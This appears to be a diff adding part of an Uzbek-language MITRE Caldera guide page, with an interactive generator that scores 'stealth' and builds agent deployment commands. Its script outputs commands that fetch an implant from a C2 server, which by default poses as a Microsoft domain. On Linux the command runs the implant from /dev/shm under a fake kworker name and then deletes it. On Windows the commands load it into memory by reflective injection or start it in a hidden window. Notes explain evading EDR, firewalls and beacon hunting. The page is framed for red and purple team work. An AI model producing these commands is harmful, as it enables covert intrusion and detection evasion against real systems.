+                        <h3 class="text-xl sm:text-2xl font-bold text-white mt-1">Caldera Stealth Agent Generator &amp; Shovqin Kalkulyatori</h3>
+                        <p class="text-xs sm:text-sm text-slate-400">Parametrlarni o'zgartiring va Caldera agentining tarmoq/EDR oldidagi "Shovqinsizlik (Stealth)" darajasi hamda hosil bo'ladigan buyruq qanday o'zgarishini jonli ko'ring.</p>
+                    </div>
+                    <!-- Live Stealth Score Meter -->
+                    <div class="bg-slate-950 border border-slate-800 rounded-2xl px-5 py-3 flex items-center gap-4 shrink-0">
+                        <div>
+                            <div class="text-[11px] font-mono text-slate-400 uppercase">Stealth / OPSEC Reytingi</div>
+                            <div id="stealth-status-label" class="text-sm font-bold text-emerald-400">Yuqori Yashirinlik (Stealth)</div>
+                        </div>
+                        <div id="stealth-score-badge" class="text-3xl font-mono font-extrabold text-emerald-400">88%</div>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+                    <!-- Controls Column -->
+                    <div class="lg:col-span-5 space-y-4">
+                        <div class="grid grid-cols-2 gap-3">
+                            <div>
+                                <label class="block text-xs font-mono text-slate-400 mb-1">Nishon Platforma</label>
+                                <select id="sim-platform" onchange="updateStealthSimulator()" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs sm:text-sm text-white focus:outline-none focus:border-emerald-500">
+                                    <option value="linux-mem">Linux (In-Memory / Fileless)</option>
+                                    <option value="windows-psh">Windows (PowerShell AMSI/Memory)</option>
+                                    <option value="windows-disk">Windows (Standart Disk Drop)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-xs font-mono text-slate-400 mb-1">Aloqa Kanali (C2 Contact)</label>
+                                <select id="sim-contact" onchange="updateStealthSimulator()" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs sm:text-sm text-white focus:outline-none focus:border-emerald-500">
+                                    <option value="https">HTTPS (443 CDN / Redirector)</option>
+                                    <option value="gist">GitHub Gist API (Domain Fronted)</option>
+                                    <option value="dns">DNS Tunneling (Port 53)</option>
+                                    <option value="http">HTTP Standart (Port 8888 - Shovqinli)</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-3">
+                            <div>
+                                <label class="block text-xs font-mono text-slate-400 mb-1">C2 Server / Domain</label>
+                                <input id="sim-server" type="text" value="https://cdn-Telemetry.microsoft-upd.com" oninput="updateStealthSimulator()" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs font-mono text-cyan-300 focus:outline-none focus:border-emerald-500">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-mono text-slate-400 mb-1">Agent Guruhi (Group)</label>
+                                <input id="sim-group" type="text" value="prod_stealth" oninput="updateStealthSimulator()" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs font-mono text-amber-300 focus:outline-none focus:border-emerald-500">
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-3">
+                            <div>
+                                <label class="block text-xs font-mono text-slate-400 mb-1">Beacon Sleep (Soniya): <span id="lbl-sleep" class="text-white font-bold">180s</span></label>
+                                <input id="sim-sleep" type="range" min="10" max="600" step="10" value="180" oninput="updateStealthSimulator()" class="w-full accent-emerald-500">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-mono text-slate-400 mb-1">Jitter (Tasodifiylik): <span id="lbl-jitter" class="text-white font-bold">35%</span></label>
+                                <input id="sim-jitter" type="range" min="0" max="50" step="5" value="35" oninput="updateStealthSimulator()" class="w-full accent-emerald-500">
+                            </div>
+                        </div>
+
+                        <div class="pt-2 space-y-2">
+                            <label class="flex items-center gap-2.5 cursor-pointer text-xs text-slate-300">
+                                <input id="sim-garble" type="checkbox" checked onchange="updateStealthSimulator()" class="rounded bg-slate-900 border-slate-700 text-emerald-500 focus:ring-0">
+                                <span><strong>Garble + Strip Symbols (<code class="text-emerald-400">-ldflags="-s -w"</code>)</strong> — Binar imzolarini yashirish</span>
+                            </label>
+                            <label class="flex items-center gap-2.5 cursor-pointer text-xs text-slate-300">
+                                <input id="sim-masquerade" type="checkbox" checked onchange="updateStealthSimulator()" class="rounded bg-slate-900 border-slate-700 text-emerald-500 focus:ring-0">
+                                <span><strong>Process Masquerading</strong> — Jarayon nomini <code class="text-cyan-300">[kworker/u4:1]</code> yoki <code class="text-cyan-300">svchost.exe</code> deb niqoblash</span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <!-- Output Terminal Column -->
+                    <div class="lg:col-span-7 flex flex-col justify-between bg-slate-950 border border-slate-800 rounded-2xl p-5 space-y-4">
+                        <div class="space-y-2">
+                            <div class="flex items-center justify-between">
+                                <span class="text-xs font-mono text-slate-400">Hosil Bo'lgan Deployment Buyrug'i:</span>
+                                <button onclick="copyCode('sim-output-cmd')" class="text-xs font-mono px-3 py-1 rounded bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 transition">
+                                    Buyruqni Nusxalash
+                                </button>
+                            </div>
+                            <pre id="sim-output-cmd" class="bg-[#060911] border border-slate-800/90 rounded-xl p-4 text-xs font-mono text-emerald-300 overflow-x-auto whitespace-pre-wrap leading-relaxed min-h-[150px]"></pre>
+                        </div>
+
+                        <!-- Telemetry Analysis Box -->
+                        <div class="bg-slate-900/90 border border-slate-800 rounded-xl p-4 space-y-2">
+                            <div class="text-xs font-mono uppercase text-cyan-400 font-semibold">SIEM / EDR Telemetriya Tahlili:</div>
+                            <p id="sim-telemetry-notes" class="text-xs text-slate-300 leading-relaxed"></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="border-t border-slate-800/80 bg-[#070a12] py-8 mt-16">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-slate-500">
+            <div class="flex items-center gap-2">
+                <span class="w-2 h-2 rounded-full bg-emerald-500"></span>
+                <span>MITRE Caldera™ Texnik Qo'llanma — Kiberxavfsizlik va Red/Purple Team Tadqiqotlari Uchun</span>
+            </div>
+            <div class="font-mono">
+                MITRE ATT&CK® Framework Compatible • O'zbek tilidagi maxsus tahlil
+            </div>
+        </div>
+    </footer>
+
+    <!-- Interactive JavaScript -->
+    <script>
+        // Mobile menu toggle
+        const mobileBtn = document.getElementById('mobile-menu-btn');
+        const mobileMenu = document.getElementById('mobile-menu');
+        if (mobileBtn && mobileMenu) {
+            mobileBtn.addEventListener('click', () => {
+                mobileMenu.classList.toggle('hidden');
+            });
+        }
+
+        // Installation Tabs Switcher
+        function switchInstallTab(tab) {
+            const tabs = ['linux', 'docker', 'prod'];
+            tabs.forEach(t => {
+                const content = document.getElementById('install-tab-' + t);
+                const btn = document.getElementById('tab-btn-' + t);
+                if (t === tab) {
+                    content.classList.remove('hidden');
+                    btn.className = 'px-4 py-1.5 rounded-lg text-xs font-mono font-semibold bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 transition';
+                } else {
+                    content.classList.add('hidden');
+                    btn.className = 'px-4 py-1.5 rounded-lg text-xs font-mono font-semibold text-slate-400 hover:text-white transition';
+                }
+            });
+        }
+
+        // Clipboard Copy Helper (iFrame safe)
+        function copyCode(elementId) {
+            const el = document.getElementById(elementId);
+            if (!el) return;
+            const text = el.innerText;
+
+            const textarea = document.createElement('textarea');
+            textarea.value = text;
+            textarea.style.position = 'fixed';
+            textarea.style.opacity = '0';
+            document.body.appendChild(textarea);
+            textarea.select();
+            try {
+                document.execCommand('copy');
+                showToast("Terminal buyrug'i xotiraga nusxalandi!");
+            } catch (err) {
+                showToast("Nusxalashda xatolik yuz berdi");
+            }
+            document.body.removeChild(textarea);
+        }
+
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            const msg = document.getElementById('toast-msg');
+            msg.textContent = message;
+            toast.classList.remove('translate-y-20', 'opacity-0');
+            setTimeout(() => {
+                toast.classList.add('translate-y-20', 'opacity-0');
+            }, 2600);
+        }
+
+        // Stealth Agent Simulator Logic
+        function updateStealthSimulator() {
+            const platform = document.getElementById('sim-platform').value;
+            const contact = document.getElementById('sim-contact').value;
+            const server = document.getElementById('sim-server').value.trim() || 'https://c2.example.com';
+            const group = document.getElementById('sim-group').value.trim() || 'red';
+            const sleep = parseInt(document.getElementById('sim-sleep').value, 10);
+            const jitter = parseInt(document.getElementById('sim-jitter').value, 10);
+            const useGarble = document.getElementById('sim-garble').checked;
+            const useMasq = document.getElementById('sim-masquerade').checked;
+
+            document.getElementById('lbl-sleep').textContent = sleep + 's';
+            document.getElementById('lbl-jitter').textContent = jitter + '%';
+
+            let score = 25; // Base score
+            let notes = [];
+
+            // Contact protocol scoring
+            if (contact === 'gist') {
+                score += 30;
+                notes.push("✓ <strong>GitHub Gist C2:</strong> Trafik faqat qonuniy <code>api.github.com</code> ga boradi, Firewall va NDR sizning C2 IP manzilingizni ko'rmaydi.");
+            } else if (contact === 'https') {
+                score += 22;
+                notes.push("✓ <strong>HTTPS Redirector:</strong> TLS shifrlangan kanal tarmoq DPI (Deep Packet Inspection) tekshiruvidan yashiradi.");
+            } else if (contact === 'dns') {
+                score += 18;
+                notes.push("✓ <strong>DNS Tunneling:</strong> Port 53 orqali TXT yozuvlarda buyruq almashadi.");
+            } else {
+                score -= 10;
+                notes.push("⚠ <strong>Ochiq HTTP (8888):</strong> Suricata/Zeek tarmoq sensorlari ochiq HTTP sarlavhalarini darhol aniqlaydi.");
+            }
+
+            // Platform / Disk vs Memory scoring
+            if (platform === 'linux-mem') {
+                score += 20;
+                notes.push("✓ <strong>Fileless Linux Execution:</strong> Agent <code>/dev/shm</code> yoki <code>python3 / memfd_create</code> orqali diskka yozilmasdan RAM xotirada ishga tushadi.");
+            } else if (platform === 'windows-psh') {
+                score += 15;
+                notes.push("✓ <strong>In-Memory PowerShell/Reflective:</strong> Diskda <code>.exe</code> fayl qolmaydi, AV fayl skaneri chetlab o'tiladi.");
+            } else {
+                score -= 10;
+                notes.push("⚠ <strong>Disk Drop:</strong> <code>C:\\Users\\Public</code> ichiga tushirilgan binar EDR On-Access Scanner tomonidan tekshiriladi.");
+            }
+
+            // Sleep & Jitter scoring
+            if (sleep >= 120 && jitter >= 20) {
+                score += 12;
+                notes.push(`✓ <strong>Beacon Timing (${sleep}s ± ${jitter}%):</strong> RITA va NDR beacon-hunting algoritmlari davriy qonuniyatni ushlay olmaydi.`);
+            } else {
+                notes.push(`⚠ <strong>Qisqa Beacon (${sleep}s):</strong> Tez-tez aloqaga chiqish SIEM/Firewall loglarida anomaliya hosil qiladi.`);
+            }
+
+            if (useGarble) {
+                score += 10;
+                notes.push("✓ <strong>Garble + Strip Symbols:</strong> Go binar ichidagi <code>sandcat</code> va funksiya satrlari shifrlangan.");
+            }
+            if (useMasq) {
+                score += 5;
+            }
+
+            score = Math.max(15, Math.min(98, score));
+
+            // Update Score UI
+            const badge = document.getElementById('stealth-score-badge');
+            const label = document.getElementById('stealth-status-label');
+            badge.textContent = score + '%';
+
+            if (score >= 80) {
+                badge.className = 'text-3xl font-mono font-extrabold text-emerald-400';
+                label.className = 'text-sm font-bold text-emerald-400';
+                label.textContent = 'Yuqori Yashirinlik (Stealth OPSEC)';
+            } else if (score >= 55) {
+                badge.className = 'text-3xl font-mono font-extrabold text-amber-400';
+                label.className = 'text-sm font-bold text-amber-400';
+                label.textContent = "O'rtacha Sezuvchanlik (Moderate)";
+            } else {
+                badge.className = 'text-3xl font-mono font-extrabold text-red-400';
+                label.className = 'text-sm font-bold text-red-400';
+                label.textContent = 'Yuqori Shovqin (EDR Ushlash Xavfi!)';
+            }
+
+            // Build Command Output
+            const procNameWin = useMasq ? 'RuntimeBroker.exe' : 'sandcat.exe';
+            const procNameLin = useMasq ? '[kworker/u4:1]' : 'sandcat.go-linux';
+            const c2Flag = contact === 'gist' ? '-c2 GIST' : (contact === 'dns' ? '-c2 DNS' : '-c2 HTTP');
+            const garbleHeader = useGarble ? '-H "gocat-extensions:garble_tiny" ' : '';
+
+            let cmd = '';
+            if (platform === 'linux-mem') {
+                cmd = `# Linux Fileless / RAM-only Stealth Deployment\n` +
+                      `curl -sk -X POST -H "file:sandcat.go" -H "platform:linux" ${garbleHeader}${server}/file/download > /dev/shm/.kworker && \\\n` +
+                      `chmod +x /dev/shm/.kworker && \\\n` +
+                      `exec -a "${procNameLin}" /dev/shm/.kworker -server ${server} -group ${group} ${c2Flag} -delay ${sleep} -jitter ${jitter} & \\\n` +
+                      `sleep 2 && rm -f /dev/shm/.kworker`;
+            } else if (platform === 'windows-psh') {
+                cmd = `# Windows In-Memory Reflective / Custom User-Agent Deployment\n` +
+                      `$wc = New-Object System.Net.WebClient;\n` +
+                      `$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");\n` +
+                      `$wc.Headers.Add("file", "sandcat.go"); $wc.Headers.Add("platform", "windows");\n` +
+                      `[Byte[]]$pe = $wc.DownloadData("${server}/file/download");\n` +
+                      `# Donut / Reflective PE Loader orqali diskka yozmasdan xotirada ishga tushirish:\n` +
+                      `Invoke-ReflectivePEInjection -PEBytes $pe -ExeArgs "-server ${server} -group ${group} ${c2Flag} -delay ${sleep} -jitter ${jitter}"`;
+            } else {
+                cmd = `# Windows Standart Deployment (Custom Process Name bilan)\n` +
+                      `$url="${server}/file/download"; $wc=New-Object System.Net.WebClient;\n` +
+                      `$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go");\n` +
+                      `$out="C:\\Users\\Public\\${procNameWin}";\n` +
+                      `$wc.DownloadFile($url, $out);\n` +
+                      `Start-Process -FilePath $out -ArgumentList "-server ${server} -group ${group} ${c2Flag} -delay ${sleep} -jitter ${jitter}" -WindowStyle Hidden`;
+            }
+
+            document.getElementById('sim-output-cmd').textContent = cmd;
+            document.getElementById('sim-telemetry-notes').innerHTML = notes.join('<br>');
+        }
+
+        // Initialize simulator on load
+        window.addEventListener('DOMContentLoaded', () => {
+            updateStealthSimulator();
+        });
+    </script>
+</body>
+</html>
